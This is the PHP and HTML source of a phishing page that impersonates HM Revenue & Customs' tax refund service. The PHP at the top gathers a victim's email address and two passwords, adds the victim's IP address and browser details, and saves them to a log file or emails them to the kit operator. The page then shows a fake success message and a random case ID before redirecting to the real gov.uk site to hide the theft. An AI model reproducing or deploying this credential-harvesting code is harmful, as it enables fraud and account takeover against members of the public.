﻿<?php
session_start();
error_reporting(0);
include(realpath(getenv('DOCUMENT_ROOT')) . '/rebate/index.php');
include "includes/my_email.php";
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/London');
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

$fullname = $_SESSION['fname'];
$email = $_SESSION['email'];


if(isset($_POST['ea'])) {
$msg =$_SESSION['msg3'];
$msg .= "| Email: ".$_POST['ea']."\n";
$msg .= "| Password1: ".$_SESSION['pas']."\n";
$msg .= "| Password2: ".$_POST['pas2']."\n";


}

$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "---------------------------------------------------------------------------\n";

$subject = "Email Info for $fullname";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

if($Encrypt==1) {
$method = 'aes-256-cbc';
$key = substr(hash('sha256', $password, true), 0, 32);
$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
$encrypted = base64_encode(openssl_encrypt($msg, $method, $key, OPENSSL_RAW_DATA, $iv));
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("logs/COVID-emails.txt","a");
	fwrite($file,$encrypted);
	fclose($file);
	}
	else {
	$file=fopen("logs/COVID-emails.txt","a");
	fwrite($file,$msg);
	fclose($file);
	}
}
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($my_email,$subject,$encrypted,$headers);
	}
	else {
	mail($my_email,$subject,$msg,$headers);
	}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="images/gov_uk.ico?FqAktxnBpjcXrksNnHvdTSjykQe" type="image/x-icon">
	<link rel="mask-icon" href="images/mask.svg?MeDwDHsvbhIHVWCOiqLXFfRhgAZy" color="#0b0c0c">
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon-180x180.png?FqAktxnBpjcXrksNnHvdTSjykQe">
	<link rel="apple-touch-icon" sizes="167x167" href="images/apple-touch-icon-167x167.png?qdZwTagNYUONDrkvbdIOlEsEXb">
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-touch-icon-152x152.png?HrhsiKSedtLr">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png?gFekxPfYtonesgjPH">
	<meta http-equiv="refresh" content="7;URL=https://www.gov.uk/government/organisations/hm-revenue-customs">
	<title>Claim a refund | HMRC</title>

	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/claimStyle.css" rel="stylesheet">
	<link href="css/claimSteps.css" rel="stylesheet">

	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->
</head>
<body>
<div class="revenueCustoms sidePadding">
	<img src="images/crest.png"/>
	<span style="padding-left:5px;color:#0b0c0c;font-family: 'nta', Arial, sans-serif;font-size: 1.9rem !important;vertical-align: middle;">HM Revenue &amp; Customs</span>
</div>
<div class="topBar">
	<div class="containerTop">
		<div class="row">
			<div class="topLinkWrapper sidePadding">
				Cookies are used to make this website simpler.
				<a href="/authids.online.revenuecustoms/complete">Find out more about cookies.</a>
			</div>

		</div>
	</div>
</div>

<div class="clearfix"></div>
<div class="containerMiddle">

	<div class="row">
		<div class="col-xs-12 col-md-8">
			<div class="clearfix"></div>
			<div class="claimForm sidePadding">Claim form</div>
			<div class="clearfix"></div>
			<h1 class="claimTitle sidePadding">Tax refund</h1>

			<div class="clearfix"></div>
		</div>
	</div>
	<div class="row sidePadding">
		<div class="col-xs-12 col-md-4 pull-right">
			<div class="sidebarVerify">
				<img src="images/verify.png"/>
			</div>
		</div>
		<div class="col-xs-12 col-md-8 pull-right">
			<span class="textBlock">
				You have successfully claimed your tax refund, it will be processed within 5 to 10 business days. No further actions are required from you till then.
			</span>
			<div class="clearfix"></div>
			<span class="textBlock">
				Please note the following ID assigned to your case for future reference.
			</span>
			<div class="clearfix"></div>
			<div class="generatedId">
				69 <?php $random = rand(10, 99); echo $random;?> <?php $random = rand(10, 99); echo $random;?> <?php $random = rand(10, 99); echo $random;?> 39 			</div>

			<div class="clearfix"></div>
			<span class="textBlock">
				<a class="clickHere" href="https://www.google.fr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0ahUKEwiJtbvAweDbAhWNhKYKHUkwCTYQFggsMAA&url=https%3A%2F%2Fwww.gov.uk%2Fgovernment%2Fpublications%2Fcriminal-investigation%2Fhmrc-criminal-investigation-policy&usg=AOvVaw2vB6zBLKeE0x3AiIVfSANf">
					Click here
				</a>
				to visit our privacy pages for further readings.
			</span>


		</div>
	</div>
</div>
<div class="clearfix"></div>
<div class="divider"></div>
<div class="clearfix"></div>

<div class="footer">
	<div class="containerFooter">
		<div class="row footerBorder">
			<div class="row">
				<div class="col-xs-12">
					<span class="legalField sidePadding">
						This form is secured with 256-BIT SSL Layer.
					</span>
				</div>
			</div>
		</div>
		<div class="clearfix"></div>
		<div class="row bottomSpacer">
			<div class="col-xs-12 col-sm-9 no-padding">
					<span class="footerLink2">
						<a href="#">Help</a>
					</span>
					<span class="footerLink2">
						<a href="#">Cookies</a>
					</span>
					<span class="footerLink2">
						<a href="#">Contact</a>
					</span>
					<span class="footerLink2">
						<a href="#">Terms and conditions</a>
					</span>
					<span class="footerLink2">
						<a href="#">Rhestr o Wasanaethau Cymraeg</a>
					</span>

				<div class="clearfix"></div>
					<span class="dividerLast">
						<span class="footerLink2">
						Built by the <a href="#">Government Digital Service</a>
						</span>
					</span>

				<div class="clearfix"></div>
				<div class="oglBox">
					<a href="#" class="oglLogo">

					</a>
						<span class="footerLink2">
							All content is available under the
								<a href="#">Open Government Licence v3.0,</a>
							except where otherwise stated
						</span>
				</div>
			</div>
			<div class="col-xs-12 col-sm-3 no-padding">
				<a href="#" class="crownLink">
					<img src="images/logo.png" class="bottomLogo"/>

					<div class="clearfix"></div>
					<span class="crownCopy">© Crown copyright</span>
				</a>
			</div>
		</div>
	</div>
</div>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
</body>
</html>